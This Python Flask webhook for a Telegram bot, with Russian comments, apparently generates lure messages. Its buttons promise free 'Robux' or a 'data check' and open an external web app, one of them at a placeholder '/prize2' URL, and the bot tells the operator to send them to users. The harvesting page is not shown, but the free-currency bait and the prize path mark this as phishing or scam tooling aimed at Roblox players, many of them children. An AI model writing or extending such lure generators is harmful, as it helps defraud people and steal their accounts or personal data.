# ========== ОБРАБОТЧИК КОМАНД ==========
@app.route("/", methods=["POST"])
def webhook():
    data = request.get_json()
    if not data:
        return "OK", 200

    if "message" in data:
        msg = data["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")

        if text == "/start":
            # Главное меню — только одна кнопка "Создать кнопку"
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}]
                ]
            }
            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)

    elif "callback_query" in data:
        query = data["callback_query"]
        chat_id = query["message"]["chat"]["id"]
        data_callback = query.get("data")

        if data_callback == "create_button":
            # Меню выбора типа кнопки
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🎁 Robux", "callback_data": "create_robux"}],
                    [{"text": "🔍 Проверить данные", "callback_data": "create_osint"}],
                    [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
                ]
            }
            send_message(chat_id, "🔧 **Выберите тип кнопки:**", reply_markup=keyboard)

        elif data_callback == "create_robux":
            # Создаём кнопку Robux
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🎁 Получить Robux", "web_app": {"url": MINI_APP_URL}}]
                ]
            }
            send_message(chat_id, "✅ Кнопка **Robux** создана! Отправьте это сообщение пользователям.", reply_markup=keyboard)

        elif data_callback == "create_osint":
            # Создаём кнопку OSINT
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔍 Проверить данные", "web_app": {"url": "https://твой-адрес/prize2"}}]
                ]
            }
            send_message(chat_id, "✅ Кнопка **Проверка данных** создана! Отправьте это сообщение пользователям.", reply_markup=keyboard)

        elif data_callback == "back_to_menu":
            # Возврат в главное меню
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔧 Создать кнопку", "callback_data": "create_button"}]
                ]
            }
            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)

    return "OK", 200
